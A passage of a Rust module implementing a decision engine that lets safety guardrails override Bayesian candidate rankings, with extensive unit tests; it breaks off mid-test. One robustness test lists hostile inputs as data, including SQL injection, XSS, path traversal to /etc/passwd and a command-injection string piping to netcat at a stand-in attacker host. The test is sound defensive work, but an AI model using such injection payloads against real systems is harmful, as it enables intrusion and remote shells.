//! bd-15u3: Guardrail precedence enforcement for policy decisions.
//!
//! Integrates the Bayesian posterior ranking (bd-2igi) with the anytime-valid
//! guardrail monitor set (bd-3a3q) to enforce a strict precedence rule:
//! guardrails ALWAYS override Bayesian recommendations.
//!
//! # Invariants
//!
//! - **INV-DECIDE-PRECEDENCE**: Guardrail verdicts override Bayesian rankings.
//!   No amount of statistical evidence authorises an action that violates a
//!   safety or durability bound.
//! - **INV-DECIDE-DETERMINISTIC**: Given identical candidates, monitors, and
//!   state, `decide` returns identical outcomes.
//! - **INV-DECIDE-NO-PANIC**: `AllBlocked` is returned (never a panic) when
//!   no candidate passes guardrails.

use serde::{Deserialize, Serialize};
use std::fmt;

use super::bayesian_diagnostics::{CandidateRef, RankedCandidate};
use super::guardrail_monitor::{GuardrailMonitorSet, GuardrailVerdict, SystemState};

/// Hardening: Push with bounded capacity to prevent memory exhaustion attacks
fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow);
    }
    items.push(item);
}

// ---------------------------------------------------------------------------
// Event codes
// ---------------------------------------------------------------------------

/// Decision made (includes chosen candidate, rank).
pub const EVD_DECIDE_001: &str = "EVD-DECIDE-001";
/// Candidate blocked by guardrail (includes guardrail_id, candidate_ref).
pub const EVD_DECIDE_002: &str = "EVD-DECIDE-002";
/// All candidates blocked.
pub const EVD_DECIDE_003: &str = "EVD-DECIDE-003";
/// Fallback to lower-ranked candidate.
pub const EVD_DECIDE_004: &str = "EVD-DECIDE-004";

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/// Identifies a specific guardrail that blocked a candidate.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct GuardrailId(pub String);

impl GuardrailId {
    pub fn new(id: impl Into<String>) -> Self {
        Self(id.into())
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for GuardrailId {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

/// A candidate that was blocked by one or more guardrails.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlockedCandidate {
    /// The candidate that was blocked.
    pub candidate: CandidateRef,
    /// Which guardrail(s) blocked this candidate.
    pub blocked_by: Vec<GuardrailId>,
    /// The candidate's original rank from the Bayesian engine (0-indexed).
    pub bayesian_rank: usize,
    /// Human-readable reasons from each blocking guardrail.
    pub reasons: Vec<String>,
}

/// Why the decision engine chose (or could not choose) a candidate.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum DecisionReason {
    /// The top-ranked candidate passed all guardrails.
    TopCandidateAccepted,
    /// The top-ranked candidate was blocked; a lower-ranked candidate was used.
    TopCandidateBlockedFallbackUsed {
        /// The rank of the fallback candidate that was chosen.
        fallback_rank: usize,
    },
    /// Every candidate was blocked by at least one guardrail.
    AllCandidatesBlocked,
    /// No candidates were provided.
    NoCandidates,
}

/// Result of the decision engine's precedence check.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecisionOutcome {
    /// The chosen candidate, if any passed guardrails.
    pub chosen: Option<CandidateRef>,
    /// All candidates that were blocked, with details.
    pub blocked: Vec<BlockedCandidate>,
    /// Why this outcome was reached.
    pub reason: DecisionReason,
    /// Epoch in which this decision was made.
    pub epoch_id: u64,
}

// ---------------------------------------------------------------------------
// DecisionEngine
// ---------------------------------------------------------------------------

/// Enforces guardrail precedence over Bayesian recommendations.
///
/// The engine iterates candidates in rank order (highest posterior first) and
/// returns the first candidate that passes all guardrails. Candidates that
/// fail any guardrail are recorded in `blocked` with the specific guardrail
/// IDs and reasons.
///
/// INV-DECIDE-PRECEDENCE: guardrails always override Bayesian rankings.
#[derive(Debug, Clone)]
pub struct DecisionEngine {
    epoch_id: u64,
}

impl DecisionEngine {
    pub fn new(epoch_id: u64) -> Self {
        Self { epoch_id }
    }

    /// Apply guardrail checks to the Bayesian ranking and return the
    /// highest-ranked candidate that passes all guardrails.
    ///
    /// The function checks both:
    /// 1. System-level guardrails (from monitors + state) — these block ALL
    ///    candidates if any system invariant is violated.
    /// 2. Per-candidate guardrail flags (`guardrail_filtered` on each
    ///    `RankedCandidate`) — these block specific candidates.
    ///
    /// [EVD-DECIDE-001] on decision made.
    /// [EVD-DECIDE-002] on candidate blocked.
    /// [EVD-DECIDE-003] on all candidates blocked.
    /// [EVD-DECIDE-004] on fallback to lower-ranked candidate.
    pub fn decide(
        &self,
        candidates: &[RankedCandidate],
        monitors: &GuardrailMonitorSet,
        state: &SystemState,
    ) -> DecisionOutcome {
        if candidates.is_empty() {
            return DecisionOutcome {
                chosen: None,
                blocked: Vec::new(),
                reason: DecisionReason::NoCandidates,
                epoch_id: self.epoch_id,
            };
        }

        // Collect system-level guardrail violations from a single certified pass.
        let certificate = monitors.certify(state);
        let system_blocks: Vec<(String, GuardrailId, String)> = certificate
            .findings
            .into_iter()
            .filter_map(|finding| {
                if let GuardrailVerdict::Block { reason, .. } = finding.verdict {
                    Some((
                        finding.monitor_name,
                        GuardrailId::new(finding.budget_id.as_str()),
                        reason,
                    ))
                } else {
                    None
                }
            })
            .collect();

        let has_system_blocks = !system_blocks.is_empty();

        let mut blocked = Vec::new();
        let mut chosen: Option<(CandidateRef, usize)> = None;

        for (rank, candidate) in candidates.iter().enumerate() {
            let mut blocking_ids: Vec<GuardrailId> = Vec::new();
            let mut blocking_reasons: Vec<String> = Vec::new();

            // System-level blocks apply to all candidates.
            if has_system_blocks {
                for (_name, gid, reason) in &system_blocks {
                    push_bounded(&mut blocking_ids, gid.clone(), 50);
                    push_bounded(&mut blocking_reasons, reason.clone(), 50);
                }
            }

            // Per-candidate guardrail filter.
            if candidate.guardrail_filtered {
                push_bounded(&mut blocking_ids, GuardrailId::new("per_candidate_guardrail"), 50);
                push_bounded(&mut blocking_reasons, format!(
                    "candidate {} blocked by guardrail filter",
                    candidate.candidate_ref.0
                ), 50);
            }

            if blocking_ids.is_empty() {
                // This candidate passes all guardrails.
                if chosen.is_none() {
                    chosen = Some((candidate.candidate_ref.clone(), rank));
                }
            } else {
                // [EVD-DECIDE-002] candidate blocked
                let _event = EVD_DECIDE_002;

                push_bounded(&mut blocked, BlockedCandidate {
                    candidate: candidate.candidate_ref.clone(),
                    blocked_by: blocking_ids,
                    bayesian_rank: rank,
                    reasons: blocking_reasons,
                }, 100);
            }
        }

        let reason = match &chosen {
            Some((_, 0)) => {
                // [EVD-DECIDE-001] top candidate accepted
                let _event = EVD_DECIDE_001;
                DecisionReason::TopCandidateAccepted
            }
            Some((_, rank)) => {
                // [EVD-DECIDE-004] fallback used
                let _event = EVD_DECIDE_004;
                DecisionReason::TopCandidateBlockedFallbackUsed {
                    fallback_rank: *rank,
                }
            }
            None => {
                // [EVD-DECIDE-003] all blocked
                let _event = EVD_DECIDE_003;
                DecisionReason::AllCandidatesBlocked
            }
        };

        DecisionOutcome {
            chosen: chosen.map(|(c, _)| c),
            blocked,
            reason,
            epoch_id: self.epoch_id,
        }
    }
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::bayesian_diagnostics::CandidateRef;
    use crate::policy::guardrail_monitor::{
        GuardrailMonitorSet, MemoryBudgetGuardrail, SystemState,
    };
    use crate::policy::hardening_state_machine::HardeningLevel;

    fn c(id: &str) -> CandidateRef {
        CandidateRef::new(id)
    }

    fn ranked(id: &str, posterior: f64, rank_filtered: bool) -> RankedCandidate {
        RankedCandidate {
            candidate_ref: c(id),
            posterior_prob: posterior,
            prior_prob: 0.5,
            observation_count: 10,
            confidence_interval: (posterior - 0.1, posterior + 0.1),
            guardrail_filtered: rank_filtered,
        }
    }

    fn healthy_state() -> SystemState {
        SystemState {
            memory_used_bytes: 500_000_000,
            memory_budget_bytes: 1_000_000_000,
            durability_level: 0.99,
            hardening_level: HardeningLevel::Standard,
            proposed_hardening_level: None,
            evidence_emission_active: true,
            memory_tail_risk: None,
            reliability_telemetry: None,
            epoch_id: 42,
        }
    }

    fn default_monitors() -> GuardrailMonitorSet {
        GuardrailMonitorSet::with_defaults()
    }

    fn engine() -> DecisionEngine {
        DecisionEngine::new(42)
    }

    fn blocked_has_id(blocked: &BlockedCandidate, guardrail_id: &str) -> bool {
        blocked
            .blocked_by
            .iter()
            .any(|id| id.as_str() == guardrail_id)
    }

    // ── Empty candidates ──

    #[test]
    fn test_decide_empty_candidates() {
        let outcome = engine().decide(&[], &default_monitors(), &healthy_state());
        assert!(outcome.chosen.is_none());
        assert!(outcome.blocked.is_empty());
        assert_eq!(outcome.reason, DecisionReason::NoCandidates);
    }

    // ── Single candidate passes ──

    #[test]
    fn test_decide_single_candidate_passes() {
        let candidates = vec![ranked("A", 0.9, false)];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(outcome.chosen, Some(c("A")));
        assert!(outcome.blocked.is_empty());
        assert_eq!(outcome.reason, DecisionReason::TopCandidateAccepted);
    }

    // ── Single candidate blocked (per-candidate) ──

    #[test]
    fn test_decide_single_candidate_blocked_per_candidate() {
        let candidates = vec![ranked("A", 0.9, true)];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.blocked.len(), 1);
        assert_eq!(outcome.blocked[0].candidate, c("A"));
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
    }

    // ── Multiple candidates, first blocked, second chosen ──

    #[test]
    fn test_decide_top_blocked_fallback_to_second() {
        let candidates = vec![
            ranked("aggressive", 0.8, true),
            ranked("conservative", 0.2, false),
        ];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(outcome.chosen, Some(c("conservative")));
        assert_eq!(outcome.blocked.len(), 1);
        assert_eq!(outcome.blocked[0].candidate, c("aggressive"));
        assert_eq!(outcome.blocked[0].bayesian_rank, 0);
        assert_eq!(
            outcome.reason,
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 1 }
        );
    }

    // ── All candidates blocked ──

    #[test]
    fn test_decide_all_blocked() {
        let candidates = vec![
            ranked("A", 0.6, true),
            ranked("B", 0.3, true),
            ranked("C", 0.1, true),
        ];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.blocked.len(), 3);
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
    }

    // ── System-level guardrail blocks all candidates ──

    #[test]
    fn test_decide_system_level_block() {
        let candidates = vec![ranked("A", 0.7, false), ranked("B", 0.3, false)];
        let mut state = healthy_state();
        state.evidence_emission_active = false; // triggers EvidenceEmissionGuardrail Block

        let outcome = engine().decide(&candidates, &default_monitors(), &state);
        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.blocked.len(), 2);
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);

        // Both candidates blocked by the same system-level guardrail
        for b in &outcome.blocked {
            assert!(
                b.blocked_by
                    .iter()
                    .any(|g| g.as_str() == "evidence_emission")
            );
        }
    }

    // ── System-level guardrail with per-candidate filter combined ──

    #[test]
    fn test_decide_system_plus_per_candidate_block() {
        let candidates = vec![
            ranked("A", 0.7, true),  // per-candidate + system
            ranked("B", 0.3, false), // system only
        ];
        let mut state = healthy_state();
        state.evidence_emission_active = false;

        let outcome = engine().decide(&candidates, &default_monitors(), &state);
        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.blocked.len(), 2);

        // Candidate A has both per-candidate and system guardrail
        let a_blocked = &outcome.blocked[0];
        assert_eq!(a_blocked.candidate, c("A"));
        assert_eq!(a_blocked.blocked_by.len(), 2);
    }

    // ── Candidate order matches Bayesian rank ──

    #[test]
    fn test_decide_preserves_bayesian_rank_order() {
        let candidates = vec![
            ranked("first", 0.6, true),
            ranked("second", 0.3, true),
            ranked("third", 0.1, false),
        ];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(outcome.chosen, Some(c("third")));
        assert_eq!(outcome.blocked[0].bayesian_rank, 0);
        assert_eq!(outcome.blocked[1].bayesian_rank, 1);
        assert_eq!(
            outcome.reason,
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 2 }
        );
    }

    // ── Memory budget guardrail blocks all ──

    #[test]
    fn test_decide_memory_budget_blocks_all() {
        let candidates = vec![ranked("A", 0.5, false), ranked("B", 0.5, false)];
        let mut state = healthy_state();
        state.memory_used_bytes = 960_000_000; // 96% > 95% threshold

        let outcome = engine().decide(&candidates, &default_monitors(), &state);
        assert!(outcome.chosen.is_none());
        for b in &outcome.blocked {
            assert!(b.blocked_by.iter().any(|g| g.as_str() == "memory_budget"));
        }
    }

    // ── Durability guardrail blocks all ──

    #[test]
    fn test_decide_durability_blocks_all() {
        let candidates = vec![ranked("A", 0.5, false)];
        let mut state = healthy_state();
        state.durability_level = 0.85; // below 0.9 minimum

        let outcome = engine().decide(&candidates, &default_monitors(), &state);
        assert!(outcome.chosen.is_none());
        assert!(
            outcome.blocked[0]
                .blocked_by
                .iter()
                .any(|g| g.as_str() == "durability_budget")
        );
    }

    // ── Hardening regression blocks all ──

    #[test]
    fn test_decide_hardening_regression_blocks_all() {
        let candidates = vec![ranked("A", 0.5, false)];
        let mut state = healthy_state();
        state.proposed_hardening_level = Some(HardeningLevel::Baseline);

        let outcome = engine().decide(&candidates, &default_monitors(), &state);
        assert!(outcome.chosen.is_none());
        assert!(
            outcome.blocked[0]
                .blocked_by
                .iter()
                .any(|g| g.as_str() == "hardening_regression")
        );
    }

    // ── Epoch propagation ──

    #[test]
    fn test_decide_epoch_id_propagated() {
        let eng = DecisionEngine::new(99);
        let candidates = vec![ranked("A", 0.5, false)];
        let outcome = eng.decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(outcome.epoch_id, 99);
    }

    // ── Healthy system, all candidates pass ──

    #[test]
    fn test_decide_multiple_candidates_all_pass() {
        let candidates = vec![
            ranked("A", 0.6, false),
            ranked("B", 0.3, false),
            ranked("C", 0.1, false),
        ];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(outcome.chosen, Some(c("A")));
        assert!(outcome.blocked.is_empty());
        assert_eq!(outcome.reason, DecisionReason::TopCandidateAccepted);
    }

    // ── Empty monitor set (no guardrails) allows everything ──

    #[test]
    fn test_decide_no_monitors_allows_all() {
        let monitors = GuardrailMonitorSet::new(); // empty
        let candidates = vec![ranked("A", 0.5, false)];
        let outcome = engine().decide(&candidates, &monitors, &healthy_state());
        assert_eq!(outcome.chosen, Some(c("A")));
    }

    // ── Per-candidate guardrail_filtered but no monitors ──

    #[test]
    fn test_decide_per_candidate_no_monitors() {
        let monitors = GuardrailMonitorSet::new();
        let candidates = vec![ranked("A", 0.7, true), ranked("B", 0.3, false)];
        let outcome = engine().decide(&candidates, &monitors, &healthy_state());
        assert_eq!(outcome.chosen, Some(c("B")));
        assert_eq!(outcome.blocked.len(), 1);
        assert_eq!(
            outcome.reason,
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 1 }
        );
    }

    // ── Blocked candidate includes reasons ──

    #[test]
    fn test_blocked_candidate_has_reasons() {
        let candidates = vec![ranked("A", 0.5, true)];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert!(!outcome.blocked[0].reasons.is_empty());
    }

    // ── Deterministic: same inputs → same outputs ──

    #[test]
    fn test_decide_deterministic() {
        let candidates = vec![
            ranked("A", 0.6, true),
            ranked("B", 0.3, false),
            ranked("C", 0.1, true),
        ];
        let monitors = default_monitors();
        let state = healthy_state();
        let eng = engine();

        let o1 = eng.decide(&candidates, &monitors, &state);
        let o2 = eng.decide(&candidates, &monitors, &state);
        assert_eq!(o1.reason, o2.reason);
        assert_eq!(o1.chosen, o2.chosen);
        assert_eq!(o1.blocked.len(), o2.blocked.len());
    }

    // ── Warn-level guardrails do NOT block candidates ──

    #[test]
    fn test_decide_warn_does_not_block() {
        let candidates = vec![ranked("A", 0.5, false)];
        let mut state = healthy_state();
        state.memory_used_bytes = 850_000_000; // 85% → warn, not block

        let outcome = engine().decide(&candidates, &default_monitors(), &state);
        assert_eq!(outcome.chosen, Some(c("A")));
        assert!(outcome.blocked.is_empty());
    }

    // ── Boundary condition: posterior tie, guardrail differentiates ──

    #[test]
    fn test_decide_tie_with_guardrail() {
        let candidates = vec![
            ranked("A", 0.5, true),  // blocked
            ranked("B", 0.5, false), // passes
        ];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(outcome.chosen, Some(c("B")));
    }

    // ── Serialization roundtrip ──

    #[test]
    fn test_decision_outcome_serialization() {
        let outcome = DecisionOutcome {
            chosen: Some(c("test")),
            blocked: vec![BlockedCandidate {
                candidate: c("blocked"),
                blocked_by: vec![GuardrailId::new("memory_budget")],
                bayesian_rank: 0,
                reasons: vec!["over limit".to_string()],
            }],
            reason: DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 1 },
            epoch_id: 42,
        };
        let json = serde_json::to_string(&outcome).unwrap();
        let parsed: DecisionOutcome = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.chosen, Some(c("test")));
        assert_eq!(parsed.epoch_id, 42);
    }

    // ── GuardrailId display and as_str ──

    #[test]
    fn test_guardrail_id_display() {
        let gid = GuardrailId::new("memory_budget");
        assert_eq!(gid.to_string(), "memory_budget");
        assert_eq!(gid.as_str(), "memory_budget");
    }

    // ── Event codes exist ──

    #[test]
    fn test_event_codes_defined() {
        assert_eq!(EVD_DECIDE_001, "EVD-DECIDE-001");
        assert_eq!(EVD_DECIDE_002, "EVD-DECIDE-002");
        assert_eq!(EVD_DECIDE_003, "EVD-DECIDE-003");
        assert_eq!(EVD_DECIDE_004, "EVD-DECIDE-004");
    }

    // ── DecisionReason variants ──

    #[test]
    fn test_decision_reason_top_accepted() {
        let r = DecisionReason::TopCandidateAccepted;
        assert_eq!(r, DecisionReason::TopCandidateAccepted);
    }

    #[test]
    fn test_decision_reason_fallback() {
        let r = DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 2 };
        assert_eq!(
            r,
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 2 }
        );
    }

    #[test]
    fn test_decision_reason_all_blocked() {
        let r = DecisionReason::AllCandidatesBlocked;
        assert_eq!(r, DecisionReason::AllCandidatesBlocked);
    }

    #[test]
    fn test_decision_reason_no_candidates() {
        let r = DecisionReason::NoCandidates;
        assert_eq!(r, DecisionReason::NoCandidates);
    }

    // ── Multiple system-level blocks accumulate ──

    #[test]
    fn test_decide_multiple_system_blocks_accumulate() {
        let candidates = vec![ranked("A", 0.5, false)];
        let mut state = healthy_state();
        state.evidence_emission_active = false;
        state.durability_level = 0.85;

        let outcome = engine().decide(&candidates, &default_monitors(), &state);
        assert!(outcome.chosen.is_none());
        // Should have at least 2 blocking guardrails on the candidate
        assert_eq!(outcome.blocked[0].blocked_by.len(), 2);
    }

    // ── Fallback picks first passing, not last ──

    #[test]
    fn test_decide_fallback_picks_first_passing() {
        let candidates = vec![
            ranked("first", 0.5, true),
            ranked("second", 0.3, false),
            ranked("third", 0.2, false),
        ];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(outcome.chosen, Some(c("second")));
        assert_eq!(
            outcome.reason,
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 1 }
        );
    }

    // ── Middle candidate blocked, last chosen ──

    #[test]
    fn test_decide_middle_and_first_blocked() {
        let candidates = vec![
            ranked("A", 0.5, true),
            ranked("B", 0.3, true),
            ranked("C", 0.2, false),
        ];
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(outcome.chosen, Some(c("C")));
        assert_eq!(outcome.blocked.len(), 2);
        assert_eq!(
            outcome.reason,
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 2 }
        );
    }

    // ── Large candidate set (100 candidates, randomized blocking) ──

    #[test]
    fn test_decide_large_candidate_set() {
        let candidates: Vec<RankedCandidate> = (0..100)
            .map(|i| ranked(&format!("C{i}"), 1.0 - (i as f64 * 0.01), i < 90))
            .collect();
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        // First 90 are blocked, C90 should be chosen
        assert_eq!(outcome.chosen, Some(c("C90")));
        assert_eq!(outcome.blocked.len(), 90);
        assert_eq!(
            outcome.reason,
            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 90 }
        );
    }

    // ── BlockedCandidate serialization ──

    #[test]
    fn test_blocked_candidate_serialization() {
        let bc = BlockedCandidate {
            candidate: c("test"),
            blocked_by: vec![GuardrailId::new("mem"), GuardrailId::new("dur")],
            bayesian_rank: 0,
            reasons: vec!["over memory".into(), "low durability".into()],
        };
        let json = serde_json::to_string(&bc).unwrap();
        let parsed: BlockedCandidate = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.candidate, c("test"));
        assert_eq!(parsed.blocked_by.len(), 2);
    }

    // ── Only one monitor registered ──

    #[test]
    fn test_decide_single_monitor_blocks() {
        let mut monitors = GuardrailMonitorSet::new();
        monitors.register(Box::new(MemoryBudgetGuardrail::default_guardrail()));

        let candidates = vec![ranked("A", 0.5, false)];
        let mut state = healthy_state();
        state.memory_used_bytes = 960_000_000;

        let outcome = engine().decide(&candidates, &monitors, &state);
        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.blocked[0].blocked_by.len(), 1);
    }

    // ── New engine with different epoch ──

    #[test]
    fn test_engine_different_epochs() {
        let eng1 = DecisionEngine::new(1);
        let eng2 = DecisionEngine::new(999);
        let candidates = vec![ranked("A", 0.5, false)];
        let o1 = eng1.decide(&candidates, &default_monitors(), &healthy_state());
        let o2 = eng2.decide(&candidates, &default_monitors(), &healthy_state());
        assert_eq!(o1.epoch_id, 1);
        assert_eq!(o2.epoch_id, 999);
    }

    // ── All candidates filtered with empty monitors still blocks ──

    #[test]
    fn test_decide_all_filtered_empty_monitors() {
        let monitors = GuardrailMonitorSet::new();
        let candidates = vec![ranked("A", 0.7, true), ranked("B", 0.3, true)];
        let outcome = engine().decide(&candidates, &monitors, &healthy_state());
        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
    }

    #[test]
    fn negative_no_candidates_do_not_create_phantom_blocks() {
        let candidates: Vec<RankedCandidate> = Vec::new();
        let mut state = healthy_state();
        state.evidence_emission_active = false;
        state.memory_used_bytes = 1_000_000_000;

        let outcome = engine().decide(&candidates, &default_monitors(), &state);

        assert!(outcome.chosen.is_none());
        assert!(outcome.blocked.is_empty());
        assert_eq!(outcome.reason, DecisionReason::NoCandidates);
    }

    #[test]
    fn negative_system_block_prevents_every_fallback_candidate() {
        let candidates = vec![
            ranked("highest-posterior", 0.90, false),
            ranked("fallback-a", 0.08, false),
            ranked("fallback-b", 0.02, false),
        ];
        let mut state = healthy_state();
        state.evidence_emission_active = false;

        let outcome = engine().decide(&candidates, &default_monitors(), &state);

        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
        assert_eq!(outcome.blocked.len(), 3);
        assert!(
            outcome
                .blocked
                .iter()
                .all(|blocked| blocked_has_id(blocked, "evidence_emission"))
        );
    }

    #[test]
    fn negative_per_candidate_filter_records_guardrail_detail_without_monitors() {
        let monitors = GuardrailMonitorSet::new();
        let candidates = vec![ranked("unsafe-candidate", 0.99, true)];

        let outcome = engine().decide(&candidates, &monitors, &healthy_state());

        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
        assert_eq!(outcome.blocked.len(), 1);
        let blocked = &outcome.blocked[0];
        assert_eq!(blocked.candidate, c("unsafe-candidate"));
        assert_eq!(blocked.bayesian_rank, 0);
        assert!(blocked_has_id(blocked, "per_candidate_guardrail"));
        assert!(
            blocked
                .reasons
                .iter()
                .any(|reason| reason.contains("unsafe-candidate"))
        );
    }

    #[test]
    fn negative_system_and_candidate_blocks_are_both_preserved() {
        let candidates = vec![ranked("double-blocked", 0.80, true)];
        let mut state = healthy_state();
        state.memory_used_bytes = 960_000_000;

        let outcome = engine().decide(&candidates, &default_monitors(), &state);

        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
        assert_eq!(outcome.blocked.len(), 1);
        let blocked = &outcome.blocked[0];
        assert!(blocked_has_id(blocked, "memory_budget"));
        assert!(blocked_has_id(blocked, "per_candidate_guardrail"));
        assert!(
            blocked
                .reasons
                .iter()
                .any(|reason| reason.contains("memory utilization"))
        );
        assert!(
            blocked
                .reasons
                .iter()
                .any(|reason| reason.contains("double-blocked"))
        );
    }

    #[test]
    fn negative_zero_memory_budget_blocks_all_candidates() {
        let candidates = vec![ranked("A", 0.60, false), ranked("B", 0.40, false)];
        let mut state = healthy_state();
        state.memory_budget_bytes = 0;
        state.memory_used_bytes = 0;

        let outcome = engine().decide(&candidates, &default_monitors(), &state);

        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
        assert_eq!(outcome.blocked.len(), 2);
        assert!(
            outcome
                .blocked
                .iter()
                .all(|blocked| blocked_has_id(blocked, "memory_budget"))
        );
    }

    #[test]
    fn negative_nan_durability_blocks_all_candidates() {
        let candidates = vec![ranked("A", 0.70, false), ranked("B", 0.30, false)];
        let mut state = healthy_state();
        state.durability_level = f64::NAN;

        let outcome = engine().decide(&candidates, &default_monitors(), &state);

        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
        assert_eq!(outcome.blocked.len(), 2);
        assert!(
            outcome
                .blocked
                .iter()
                .all(|blocked| blocked_has_id(blocked, "durability_budget"))
        );
    }

    #[test]
    fn negative_system_block_preserves_each_original_rank() {
        let candidates = vec![
            ranked("rank-zero", 0.50, false),
            ranked("rank-one", 0.30, false),
            ranked("rank-two", 0.20, false),
        ];
        let mut state = healthy_state();
        state.evidence_emission_active = false;

        let outcome = engine().decide(&candidates, &default_monitors(), &state);

        assert!(outcome.chosen.is_none());
        assert_eq!(outcome.reason, DecisionReason::AllCandidatesBlocked);
        assert_eq!(outcome.blocked[0].candidate, c("rank-zero"));
        assert_eq!(outcome.blocked[0].bayesian_rank, 0);
        assert_eq!(outcome.blocked[1].candidate, c("rank-one"));
        assert_eq!(outcome.blocked[1].bayesian_rank, 1);
        assert_eq!(outcome.blocked[2].candidate, c("rank-two"));
        assert_eq!(outcome.blocked[2].bayesian_rank, 2);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // NEGATIVE-PATH EDGE CASE AND ATTACK VECTOR TESTS
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn negative_decision_engine_with_maximum_epoch_id_arithmetic_safety() {
        // Test decision engine with u64::MAX epoch ID to verify no overflow
        let engine = DecisionEngine::new(u64::MAX);
        let candidates = vec![ranked("max-epoch", 0.5, false)];

        let outcome = engine.decide(&candidates, &default_monitors(), &healthy_state());

        assert_eq!(outcome.epoch_id, u64::MAX);
        assert_eq!(outcome.chosen, Some(c("max-epoch")));
        assert_eq!(outcome.reason, DecisionReason::TopCandidateAccepted);

        // Test serialization with maximum epoch ID
        let json = serde_json::to_string(&outcome).unwrap();
        let parsed: DecisionOutcome = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.epoch_id, u64::MAX);
    }

    #[test]
    fn negative_guardrail_id_with_unicode_and_injection_attacks() {
        // Test GuardrailId with various Unicode and injection attack vectors
        let malicious_ids = vec![
            "\u{202E}fake_id\u{202D}",                    // Unicode BiDi override
            "id\u{00A0}nonbreaking\u{200B}zerowidth",    // Invisible Unicode chars
            "guardrail\x00null\x01control",               // Null bytes and control chars
            "id'; DROP TABLE decisions; --",              // SQL injection attempt
            "<script>alert('xss')</script>",              // XSS attempt
            "../../etc/passwd",                            // Path traversal
            "id|nc attacker.com 4444",                    // Command injection
            "\u{1F4A9}emoji_id\u{1F600}",                // Emoji characters
            "café\u{0301}normalized",                     // NFD normalization
            "\n\r\nHTTP/1.1 200 OK\r\n\r\n<html>",       // HTTP header injection
        ];

        for malicious_id in malicious_ids {
            let guardrail_id = GuardrailId::new(&malicious_id);

            // Should store the ID literally without sanitization
            assert_eq!(guardrail_id.as_str(), malicious_id);
            assert_eq!(guardrail_id.to_string(), malicious_id);

            // Test in BlockedCandidate context
            let blocked = BlockedCandidate {
                candidate: c("test"),
                blocked_by: vec![guardrail_id],
                bayesian_rank: 0,
                reasons: vec![format!("Blocked by {}", malicious_id)],
            };

            // Should handle malicious content in serialization
            let json_result = serde_json::to_string(&blocked);
            assert!(json_result.is_ok());

            let parsed: BlockedCandidate = serde_json::from_str(&json_result.unwrap()).unwrap();
            assert_eq!(parsed.blocked_by[0].as_str(), malicious_id);
            assert!(parsed.reasons[0].contains(&malicious_id));
        }
    }

    #[test]
    fn negative_massive_candidate_set_performance_and_memory_stress_test() {
        // Test decision engine with very large candidate set (10,000 candidates)
        let huge_candidate_count = 10_000;
        let candidates: Vec<RankedCandidate> = (0..huge_candidate_count)
            .map(|i| {
                let posterior = 1.0 - (i as f64 / huge_candidate_count as f64);
                ranked(&format!("candidate_{:05}", i), posterior, i % 100 == 0) // Every 100th blocked
            })
            .collect();

        let start = std::time::Instant::now();
        let outcome = engine().decide(&candidates, &default_monitors(), &healthy_state());
        let duration = start.elapsed();

        // Should complete within reasonable time (30 seconds is generous)
        assert!(duration < std::time::Duration::from_secs(30));

        // Should choose first unblocked candidate (candidate_001, rank 1)
        assert_eq!(outcome.chosen, Some(c("candidate_00001")));
